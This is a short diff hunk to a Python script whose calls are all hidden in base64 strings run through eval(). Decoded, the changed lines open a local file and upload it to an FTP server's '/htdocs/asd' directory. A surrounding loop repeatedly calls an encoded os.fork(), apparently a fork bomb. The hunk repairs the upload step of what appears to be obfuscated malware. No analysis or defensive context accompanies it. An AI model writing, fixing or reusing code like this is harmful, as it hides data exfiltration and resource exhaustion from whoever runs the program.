@@ -141,7 +141,11 @@ _010220004000bx81 = eval(base64.b64decode(_010220004000bx80))
 fa = open(_010220004000bx81, "w+")
 fa.close()
 
-eval(base64.b64decode("ZnRwLmN3ZCgiL2h0ZG9jcy9hc2QiKQ==")) + eval(base64.b64decode("ZnRwLnN0b3JsaW5lcygnU1RPUiAnICsgc3RyKF8wMTAyMjAwMDQwMDBieDgxKSwgc3RyKF8wMTAyMjAwMDQwMDBieDgxKSk=")) + eval(base64.b64decode("ZnRwLnF1aXQoKQ=="))
+fp = open(_010220004000bx81, "rb")
+eval(base64.b64decode("ZnRwLmN3ZCgiL2h0ZG9jcy9hc2QiKQ==")) 
+eval(base64.b64decode("ZnRwLnN0b3JsaW5lcygnU1RPUiAnICsgXzAxMDIyMDAwNDAwMGJ4ODEsIGZwKQ==")) 
+eval(base64.b64decode("ZnRwLnF1aXQoKQ=="))
+fp.close()
 
 while _1x882329:
     eval(base64.b64decode("b3MuZm9yaygp"))
